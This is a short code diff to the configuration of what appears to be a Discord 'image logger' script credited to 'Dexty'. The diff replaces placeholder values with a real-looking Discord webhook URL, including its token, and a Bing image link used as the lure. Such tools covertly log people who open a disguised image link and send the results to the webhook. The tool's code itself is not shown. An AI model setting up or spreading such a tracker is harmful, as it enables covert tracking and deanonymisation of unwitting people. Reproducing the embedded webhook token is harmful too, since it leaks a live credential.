@@ -12,8 +12,8 @@ __author__ = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discordapp.com/api/webhooks/1408999934384013373/krc-8kYWBK8LNWg3F2RfNKUpaIHaDUdAlCiLhtG3xgNcmEWL1HyyQNRPS6jZ19ZtdHaH",
+    "image": "https://tse1.mm.bing.net/th/id/OIP.VHQmkg_uFqfk9ScdtTy_ywHaFj?r=0&rs=1&pid=ImgDetMain&o=7&rm=3", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
